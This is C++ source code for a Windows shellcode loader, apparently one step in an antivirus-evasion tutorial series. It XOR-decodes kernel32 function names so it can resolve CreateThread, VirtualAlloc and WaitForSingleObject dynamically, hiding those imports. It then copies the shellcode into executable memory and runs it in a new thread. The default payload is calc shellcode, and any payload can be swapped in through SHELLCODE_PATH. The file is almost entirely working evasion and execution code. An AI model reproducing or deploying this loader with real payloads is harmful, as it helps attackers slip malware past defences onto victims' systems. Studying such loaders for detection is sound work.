#include <windows.h>
#include <cstdio>

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/unobfuscated_calc.hpp"
#endif


void my_xor(unsigned char data[], int size, const unsigned char key[], int key_size)
{
	for (int i = 0; i < size; i++)
	{
		data[i] = data[i] ^ key[i % key_size];
	}
}

int main()
{

#include "functions.hpp"

	// Step 1 : Get the addresses of the functions we want to call

	// Let's first get the address of the kernel32.dll module
	// Also, the string containing "KERNEL32.dll" is XORed with the associated key, so we have to XOR it back
	my_xor(KERNEL32_dll_obfuscated_function_name, sizeof(KERNEL32_dll_obfuscated_function_name), KERNEL32_dll_key, sizeof(KERNEL32_dll_key));
	HMODULE kernel32_dll = GetModuleHandleA((char*)KERNEL32_dll_obfuscated_function_name);

	// The strings containing the function names are XORed with the associated key, so we have to XOR them back as well
	my_xor(CreateThread_obfuscated_function_name, sizeof(CreateThread_obfuscated_function_name), CreateThread_key, sizeof(CreateThread_key));
	my_xor(VirtualAlloc_obfuscated_function_name, sizeof(VirtualAlloc_obfuscated_function_name), VirtualAlloc_key, sizeof(VirtualAlloc_key));
	my_xor(WaitForSingleObject_obfuscated_function_name, sizeof(WaitForSingleObject_obfuscated_function_name), WaitForSingleObject_key, sizeof(WaitForSingleObject_key));

	// Get the addresses of the functions we want to call
	FARPROC CreateThread_address = GetProcAddress(kernel32_dll, (char*)CreateThread_obfuscated_function_name);
	FARPROC VirtualAlloc_address = GetProcAddress(kernel32_dll, (char*)VirtualAlloc_obfuscated_function_name);
	FARPROC WaitForSingleObject_address = GetProcAddress(kernel32_dll, (char*)WaitForSingleObject_obfuscated_function_name);

	// Finally, let's get pointers to the functions we want to call
	typedef HANDLE (WINAPI* pCreateThread)(
		LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		SIZE_T                  dwStackSize,
		LPTHREAD_START_ROUTINE  lpStartAddress,
		__drv_aliasesMem LPVOID lpParameter,
		DWORD                   dwCreationFlags,
		LPDWORD                 lpThreadId
	);

	typedef LPVOID (WINAPI* pVirtualAlloc)(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect
	);

	typedef DWORD (WINAPI* pWaitForSingleObject)(
		HANDLE hHandle,
		DWORD  dwMilliseconds
	);

	auto CreateThread = (pCreateThread)CreateThread_address;
	auto VirtualAlloc = (pVirtualAlloc)VirtualAlloc_address;
	auto WaitForSingleObject = (pWaitForSingleObject)WaitForSingleObject_address;

#if DEBUG
	printf("Shellcode is located at %p\n", shellcode);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 2 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 3 : Copy the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 4 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
